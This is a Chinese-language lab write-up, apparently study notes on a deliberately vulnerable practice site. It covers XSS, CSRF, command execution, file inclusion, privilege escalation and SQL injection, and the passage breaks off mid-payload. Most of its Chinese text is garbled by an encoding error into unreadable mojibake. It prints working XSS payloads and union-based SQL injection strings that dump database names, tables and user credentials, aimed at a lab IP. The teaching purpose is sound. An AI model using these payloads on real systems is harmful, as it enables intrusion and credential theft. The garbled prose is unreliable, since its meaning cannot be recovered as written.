XSSä¹‹href\nè¾“å…¥ä¼šè¢«æ‹¼æ¥åˆ°hrefå±æ€§é‡Œ,å•å¼•å·æ— æ³•é—­åˆ,ä½¿ç”¨`javascript:`æ¥æ‰§è¡Œjsä»£ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202205221556988.png)\n\n- payload\n```js\njavascript:alert(/xss/)\n```\n\n## XSSä¹‹jsè¾“å‡º\næ’å…¥jsåå‘ç°æ²¡è¢«é—­åˆ,å°†å‰é¢çš„æ ‡ç­¾é—­åˆæ‰\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221602105.png)\n\n- payload\n```js\n</script><script>alert(/123/)</script>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205221604616.png)\n\n\n# CSRF\n    CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )æ¦‚è¿°\n    Cross-site request forgery ç®€ç§°ä¸ºâ€œCSRFâ€ï¼Œåœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿæˆä¸º\"one click\"æ”»å‡»ã€‚ å¾ˆå¤šäººæä¸æ¸…æ¥šCSRFçš„æ¦‚å¿µï¼Œç”šè‡³æœ‰æ—¶å€™ä¼šå°†å…¶å’ŒXSSæ··æ·†,æ›´æœ‰ç”šè€…ä¼šå°†å…¶å’Œè¶Šæƒé—®é¢˜æ··ä¸ºä¸€è°ˆ,è¿™éƒ½æ˜¯å¯¹åŸç†æ²¡ææ¸…æ¥šå¯¼è‡´çš„ã€‚\n    è¿™é‡Œåˆ—ä¸¾ä¸€ä¸ªåœºæ™¯è§£é‡Šä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©ä½ ç†è§£ã€‚\n    åœºæ™¯éœ€æ±‚ï¼š\n    å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½åœ¨è´­ç‰©ç½‘ç«™tianxiewww.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€ã€‚\n    å…ˆçœ‹ä¸‹å¤§ç™½æ˜¯å¦‚ä½•ä¿®æ”¹è‡ªå·±çš„å¯†ç çš„ï¼š\n    ç™»å½•---ä¿®æ”¹ä¼šå‘˜ä¿¡æ¯ï¼Œæäº¤è¯·æ±‚---ä¿®æ”¹æˆåŠŸã€‚\n    æ‰€ä»¥å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½çš„ä¿¡æ¯ï¼Œä»–éœ€è¦æ‹¥æœ‰ï¼š1ï¼Œç™»å½•æƒé™ 2ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ã€‚\n    ä½†æ˜¯å¤§ç™½åˆä¸ä¼šæŠŠè‡ªå·±xxxç½‘ç«™çš„è´¦å·å¯†ç å‘Šè¯‰å°é»‘ï¼Œé‚£å°é»‘æ€ä¹ˆåŠï¼Ÿ\n    äºæ˜¯ä»–è‡ªå·±è·‘åˆ°www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼š\n    ã€http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Changeã€‘\n    äºæ˜¯ï¼Œä»–å®æ–½äº†è¿™æ ·ä¸€ä¸ªæ“ä½œï¼šæŠŠè¿™ä¸ªé“¾æ¥ä¼ªè£…ä¸€ä¸‹ï¼Œåœ¨å°ç™½ç™»å½•xxxç½‘ç«™åï¼Œæ¬ºéª—ä»–è¿›è¡Œç‚¹å‡»ï¼Œå°ç™½ç‚¹å‡»è¿™ä¸ªé“¾æ¥åï¼Œä¸ªäººä¿¡æ¯å°±è¢«ä¿®æ”¹äº†,å°é»‘å°±å®Œæˆäº†æ”»å‡»ç›®çš„ã€‚\n    ä¸ºå•¥å°é»‘çš„æ“ä½œèƒ½å¤Ÿå®ç°å‘¢ã€‚æœ‰å¦‚ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š\n    1.www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒï¼Œå¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ;\n    ---å› æ­¤ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œ(å¢åˆ æ”¹)æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ ã€‚\n    2.å°ç™½ç‚¹å‡»äº†å°é»‘å‘ç»™çš„é“¾æ¥ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶å€™å°ç™½åˆšå¥½ç™»å½•åœ¨è´­ç‰©ç½‘ä¸Š;\n    ---å¦‚æœå°ç™½å®‰å…¨æ„è¯†é«˜ï¼Œä¸ç‚¹å‡»ä¸æ˜é“¾æ¥ï¼Œåˆ™æ”»å‡»ä¸ä¼šæˆåŠŸï¼Œåˆæˆ–è€…å³ä½¿å°ç™½ç‚¹å‡»äº†é“¾æ¥ï¼Œä½†å°ç™½æ­¤æ—¶å¹¶æ²¡æœ‰ç™»å½•è´­ç‰©ç½‘ç«™ï¼Œä¹Ÿä¸ä¼šæˆåŠŸã€‚\n    ---å› æ­¤ï¼Œè¦æˆåŠŸå®æ–½ä¸€æ¬¡CSRFæ”»å‡»ï¼Œéœ€è¦â€œå¤©æ—¶ï¼Œåœ°åˆ©ï¼Œäººå’Œâ€çš„æ¡ä»¶ã€‚\n    å½“ç„¶ï¼Œå¦‚æœå°é»‘äº‹å…ˆåœ¨xxxç½‘çš„é¦–é¡µå¦‚æœå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´ï¼Œåˆ™å°é»‘å¯èƒ½ä¼šè¿™æ ·åšï¼š æ¬ºéª—å°ç™½è®¿é—®åŸ‹ä¼äº†XSSè„šæœ¬ï¼ˆç›—å–cookieçš„è„šæœ¬ï¼‰çš„é¡µé¢ï¼Œå°ç™½ä¸­æ‹›ï¼Œå°é»‘æ‹¿åˆ°å°ç™½çš„cookieï¼Œç„¶åå°é»‘é¡ºåˆ©ç™»å½•åˆ°å°ç™½çš„åå°ï¼Œå°é»‘è‡ªå·±ä¿®æ”¹å°ç™½çš„ç›¸å…³ä¿¡æ¯ã€‚\n    ---æ‰€ä»¥è·Ÿä¸Šé¢æ¯”ä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹å‡ºCSRFä¸XSSçš„åŒºåˆ«ï¼šCSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚\n    å› æ­¤ï¼Œç½‘ç«™å¦‚æœè¦é˜²æ­¢CSRFæ”»å‡»ï¼Œåˆ™éœ€è¦å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å¯¹åº”çš„å®‰å…¨æªæ–½ï¼Œé˜²æ­¢è¿™äº›æ“ä½œå‡ºç°è¢«ä¼ªé€ çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´CSRFã€‚æ¯”å¦‚ï¼š\n    --å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„tokenï¼›\n    --å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„éªŒè¯ç ï¼›\n    --å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å®‰å…¨çš„é€»è¾‘æµç¨‹ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç æ—¶ï¼Œéœ€è¦å…ˆæ ¡éªŒæ—§å¯†ç ç­‰ã€‚\n\n\n## CSRF(GET)\nä½¿ç”¨googleå’Œedgeåˆ†åˆ«ç™»å½•ä¸¤ä¸ªä¸åŒçš„è´¦å·\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232046252.png)\n\nä½¿ç”¨googleæµè§ˆå™¨æŠ“åŒ…ä¿®æ”¹æ•°æ®åŒ…,å‘é€ç»™csrf poc\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232050882.png)\n\nç”Ÿæˆpoc\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232052249.png)\n\nå¤åˆ¶urlåˆ°edgeæ‰“å¼€\n![](https://raw.githubusercontent.com/chencicici/images/main/202205232057945.png)\n\nå¯ä»¥çœ‹åˆ°edgeç™»å½•çš„è´¦å·ä¸ªäººä¿¡æ¯å·²ç»ä¿®æ”¹\n\n## CSRF(GET)\nåŒä¸Š,åªä¸è¿‡æ¢äº†è¯·æ±‚æ–¹å¼\n\n\n## CSRF(TOKEN)\nè·Ÿå‰é¢æ¯”è¾ƒï¼Œè¿™é‡Œå¤šäº†ä¸€ä¸ªTokenï¼Œå¦‚æœåå°å¯¹æäº¤çš„Tokenè¿›è¡Œäº†éªŒè¯ï¼Œç”±äºTokenæ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬å°±æ— æ³•ä¼ªé€ URLäº†ã€‚\n\n\n# RCE\n    RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚\n    è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ\n    ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£\n    æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Š\n    ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨\n    ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡\"è‡ªåŠ¨åŒ–è¿ç»´å¹³å°\"è¿›è¡Œæ“ä½œã€‚ åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´,ä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹,ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„\"æ”¶è·\"-_-\n\n    è¿œç¨‹ä»£ç æ‰§è¡Œ\n    åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚\n    å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚\n    ä½ å¯ä»¥é€šè¿‡â€œRCEâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\n## exec \"ping\"\nä½¿ç”¨`|`,ç®¡é“ç¬¦,å°†å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„ç»“æœæ‹¿åé¢ä¸€ä¸ªå‘½ä»¤\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205241601018.png)\n\n\n## exec eval\nä¼šæ‰§è¡Œphpä»£ç \n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205241604192.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205241605900.png)\n\n\n# FILE INCLUDE\n    æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚ æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼š\n    include(),include_once()\n    require(),require_once()\n    è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚\n    å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚ æ ¹æ®ä¸åŒçš„é…ç½®ç¯å¢ƒï¼Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š\n    1.æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼šä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº› å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚\n    2.è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼šèƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚\n    å› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œå¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚\n   \n\n## file include(local)\nè¯»å–/etc/passwd\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262128057.png)\n\n\n## file include(remote)\nè¿œç¨‹åŒ…å«ä¸€å¥è¯\n![](https://raw.githubusercontent.com/chencicici/images/main/202205262146838.png)\n\n# unsafe filedownload\nå¤åˆ¶å›¾ç‰‡ä¸‹è½½é“¾æ¥,æ›¿æ¢,ä¼šä¸‹è½½/etc/passwdæ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202205271501023.png)\n\n\n# è¶Šæƒ\n    å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚ è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº† ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚\n    ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹ å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚\n    å› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š\n    1.ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;\n    2.ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;\n    3.ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶;\n    ä½ å¯ä»¥é€šè¿‡â€œOver permissionâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\n## æ°´å¹³è¶Šæƒ\nå…ˆç™»å½•lucyè´¦å·\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272040293.png)\n\nä¿®æ”¹urlä¸ºå…¶ä»–è´¦å·\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272041852.png)\n\näº§ç”Ÿæ°´å¹³è¶Šæƒ\n\n\n## å‚ç›´è¶Šæƒ\nç™»å½•ç®¡ç†å‘˜è´¦å·,å¹¶æ·»åŠ ç”¨æˆ·\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272044689.png)\n\næŠ“å–æ·»åŠ ç”¨æˆ·çš„æ•°æ®åŒ…\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272053361.png)\n\nç™»å½•æ™®é€šç”¨æˆ·,æŠ“å–æ•°æ®åŒ…,æ›¿æ¢cookieåˆ°åˆšåˆšæŠ“å–çš„ç®¡ç†å‘˜æ•°æ®åŒ…ä¸­çš„cookie\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272104878.png)\n\nä»¥æ™®é€šç”¨æˆ·çš„cookieè¿›è¡Œæ“ä½œ\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272106863.png)\n\nå†æ¬¡ç™»å½•ç®¡ç†å‘˜è´¦å·,æŸ¥çœ‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202205272107993.png)\n\næ·»åŠ ç”¨æˆ·æˆåŠŸ\n\n# sqlæ³¨å…¥\n    åœ¨owaspå‘å¸ƒçš„top10æ’è¡Œæ¦œé‡Œï¼Œæ³¨å…¥æ¼æ´ä¸€ç›´æ˜¯å±å®³æ’åç¬¬ä¸€çš„æ¼æ´ï¼Œå…¶ä¸­æ³¨å…¥æ¼æ´é‡Œé¢é¦–å½“å…¶å†²çš„å°±æ˜¯æ•°æ®åº“æ³¨å…¥æ¼æ´ã€‚\n    SQLæ³¨å…¥æ¼æ´ä¸»è¦å½¢æˆçš„åŸå› æ˜¯åœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œå¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­åï¼Œè¢«å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œã€‚ ä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±è£¤ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰ã€‚\n\n## åˆ†éš”ç¬¦å’Œæ³¨é‡Šç¬¦\n- urlä½¿ç”¨`ç©ºæ ¼`æˆ–è€…`%20`\n- burpä½¿ç”¨ `+`\n- getä½¿ç”¨ `--+` æ³¨é‡Š\n- postä½¿ç”¨ `#` æ³¨é‡Š\n\n## æ³¨å…¥å¸¸ç”¨å‡½æ•°\n- like â€˜ro%â€™            # åˆ¤æ–­roæˆ–roâ€¦æ˜¯å¦æˆç«‹\n- regexp â€˜^xiaodi[a-z]â€™ # æ­£åˆ™,åŒ¹é…xiaodiåŠxiaodiâ€¦ç­‰\n- if(æ¡ä»¶,5,0)           # æ¡ä»¶æˆç«‹ è¿”å›5 åä¹‹ è¿”å›0\n- sleep(5)              # SQLè¯­å¥å»¶æ—¶æ‰§è¡Œ5ç§’\n- mid(a,b,c)            # ä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–aå­—ç¬¦ä¸²çš„cä½\n- substr(a,b,c)         # ä»bä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦,ä»1å¼€å§‹\n- left(database(),1)    # ä»å·¦ä¾§æˆªå–açš„å‰bä½\n- length(database())=8  # åˆ¤æ–­æ•°æ®åº“å½“å‰åº“åçš„é•¿åº¦\n- ord=ascii ascii(x)=97 # åˆ¤æ–­xçš„asciiç æ˜¯å¦ç­‰äº97\n- limit(a,b)            # é™åˆ¶è¡Œæ•°,ä»aæ¡è®°å½•å¼€å§‹,è¿”å›bæ¡è®°å½• limit(1,1)\n## æ•°å­—å‹æ³¨å…¥(POST)\n1. ä½¿ç”¨burpsuiteæŠ“åŒ…,å¯¹å‚æ•°åˆ¤æ–­æ³¨å…¥\n```bash\nid=1' and=1 &submit=%E6%9F%A5%E8%AF%A2\n```\n\n2. æŠ¥é”™,å°è¯•æ³¨å…¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151333668.png?token=ARYCSAS5X3DNSIBK2JN7L5DCQCIOO)\n\n3. å°è¯•æ³¨å…¥,2åˆ—\n```bash\nid=1 order by 2&submit=%E6%9F%A5%E8%AF%A2\n```\n\n4. çˆ†å‡ºå›æ˜¾ä½\n```bash\nid=1 union select 1,2&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151335056.png?token=ARYCSAUNWHHQI3WY2EMVR6TCQCIUC)\n\n5. çˆ†åº“å\n```bash\nid=1 union select database(),user()&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151335214.png?token=ARYCSAXY7XPWYZ52NLBN633CQCIWC)\n\n6. çˆ†è¡¨å\n```bash\nid=1  union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151336796.png?token=ARYCSASKTPN6D7C276OH2MTCQCIZY)\n\n7. çˆ†å­—æ®µ\n```bash\nid=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'\n&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151336584.png?token=ARYCSARJ2QB3VIHRUF7BBGLCQCI3C)\n\n8. çˆ†æ•°æ®\n```bash\nid=1 union select 1,(select concat(0x7e,group_concat(username,password),0x7e) from users )#\n&submit=%E6%9F%A5%E8%AF%A2\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151337610.png?token=ARYCSAXFRTG7KB3R6NRVTQDCQCI4S)\n\n\n\n## å­—ç¬¦å‹(get)\n\n1. åˆ¤æ–­æ³¨å…¥,å­—ç¬¦å‹ä¸€èˆ¬éƒ½éœ€è¦é—­åˆ\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'1\n```\næŠ¥é”™,è¯´æ˜æ˜¯ç”± `'` å¼•èµ·çš„æ³¨å…¥\n\n\n2. ä¸‡èƒ½å¯†ç \n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=aa'  or 1=1  --+\n```\nä¼šçˆ†å‡ºæ‰€æœ‰è´¦å·å¯†ç \n\n\n3. åˆ¤æ–­åˆ—\n```bash\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=aa'  order by 2  --+\n```\nå›æ˜¾æ­£å¸¸è¯´æ˜2åˆ—\n\n4. çˆ†æ‰€æœ‰åº“å\n```\nhttp://10.20.146.195:8080/vul/sqli/sqli_str.php?name=admin'  union select 